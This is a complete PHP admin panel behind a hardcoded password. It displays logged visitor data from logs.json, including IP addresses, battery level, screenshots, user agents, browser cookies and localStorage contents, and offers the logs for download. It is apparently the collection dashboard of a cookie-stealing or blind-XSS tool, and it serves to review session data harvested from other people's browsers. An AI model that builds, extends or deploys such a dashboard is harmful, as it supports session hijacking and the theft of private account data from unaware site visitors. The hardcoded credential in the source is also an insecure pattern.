<?php
session_start();
$hardcoded_password = "Sup3r_S3cr3t";

// Handle login
if (isset($_POST['password'])) {
    if ($_POST['password'] === $hardcoded_password) {
        $_SESSION['admin_logged_in'] = true;
    } else {
        $error = "Invalid password.";
    }
}

// Show login page if not authenticated
if (!isset($_SESSION['admin_logged_in'])) {
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Login</title>
<style>
body{background:#1c1c1c;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
.login{background:rgba(0,0,0,0.8);padding:20px 30px;border-radius:8px;box-shadow:0 4px 10px rgba(0,0,0,0.5);}
input[type="password"]{width:220px;padding:8px;border:1px solid #555;border-radius:4px;margin-bottom:12px;background:#222;color:#eee;}
input[type="submit"]{padding:8px 16px;border:none;background:#555;border-radius:4px;color:#eee;cursor:pointer;}
</style>
</head>
<body>
<div class="login">
<h2>Admin Login</h2>
<?php if(isset($error)){ echo "<p style='color:#f88;'>$error</p>"; } ?>
<form method="POST">
<input type="password" name="password" placeholder="Enter password" required>
<br>
<input type="submit" value="Login">
</form>
</div>
</body>
</html>
<?php exit; }

// Load logs
$logs_file = __DIR__.'/logs.json';
$logs = file_exists($logs_file) ? json_decode(file_get_contents($logs_file), true) : [];

// Sort logs by time desc
usort($logs, function($a,$b){
    return strtotime($b['time']) - strtotime($a['time']);
});
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Admin Panel</title>
<style>
body {
  background-color:#1c1c1c;
  background-image: radial-gradient(circle at center, rgba(255,255,255,0.02), transparent 70%),
  repeating-conic-gradient(from 45deg, rgba(255,255,255,0.03) 0deg, rgba(255,255,255,0.03) 10deg, transparent 10deg, transparent 20deg);
  background-blend-mode: overlay;
  color:#eee;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  margin:0;
  padding:20px;
}
h1 {text-align:center;color:#fff;margin-bottom:10px;}
a.logs-link {display:block;text-align:center;color:#0bf;text-decoration:none;margin-bottom:20px;}
table {width:100%;border-collapse:collapse;background:rgba(0,0,0,0.5);margin-bottom:40px;}
th, td {border:1px solid #444;padding:10px 8px;text-align:left;font-size:0.9em;}
th {background-color:#333;}
tr:nth-child(even) {background-color:rgba(255,255,255,0.03);}
.screenshot img {width:120px;border:1px solid #555;border-radius:4px;}
.container {max-width:1200px;margin:auto;}
</style>
</head>
<body>
<div class="container">
<a class="logs-link" href="download_logs.php">Download Logs</a>
<table>
<thead>
  <tr>
    <th>Serial No</th>
    <th>Time</th>
    <th>IP Address</th>
    <th>Battery %</th>
    <th>Referer</th>
    <th>Screenshot</th>
    <th>User Agent</th>
    <th>Cookies</th>
    <th>LocalStorage</th>
  </tr>
</thead>
<tbody>
<?php
if(empty($logs)){
    echo "<tr><td colspan='9' style='text-align:center;'>No logs available.</td></tr>";
} else {
    $serial = 1;
    foreach ($logs as $log) {
        $time       = isset($log['time']) ? $log['time'] : '';
        if ($time) {
            // Create a DateTime object and set the timezone to UTC+4 (Asia/Dubai)
            $datetime = new DateTime($time, new DateTimeZone('UTC'));
            $datetime->setTimezone(new DateTimeZone('Asia/Dubai')); // Convert to UTC+4
            $time = $datetime->format('Y-m-d H:i:s'); // Format the time
        }
        $time = htmlspecialchars($time); // Make sure to escape any special characters in the time
        $ip         = htmlspecialchars($log['ip'] ?? '');
        $battery    = htmlspecialchars($log['battery'] ?? '');
        $referrer   = isset($log['referrer']) ? htmlspecialchars(urldecode($log['referrer'])) : 'N/A'; // URL decode and HTML escape the referer
        $ua         = isset($log['headers']['User-Agent']) ? htmlspecialchars($log['headers']['User-Agent']) : '';
        $cookies    = htmlspecialchars($log['cookies'] ?? '');
        $localStorage = isset($log['localStorage']) ? htmlspecialchars(json_encode($log['localStorage'])) : 'N/A'; // Ensure localStorage is displayed properly
        $screenshot = !empty($log['screenshot']) 
                        ? "<a href='./screenshots/" . urlencode($log['screenshot']) . "' target='_blank'><img src='./screenshots/" . urlencode($log['screenshot']) . "' alt='Screenshot'></a>" 
                        : "N/A";

        echo "<tr>
                <td>$serial</td>
                <td>$time</td>
                <td>$ip</td>
                <td>$battery</td>
                <td>$referrer</td>
                <td class='screenshot'>$screenshot</td>
                <td>$ua</td>
                <td>$cookies</td>
                <td>$localStorage</td>
              </tr>";
        $serial++;
    }
}
?>
</tbody>
</table>
</div>
</body>
</html>
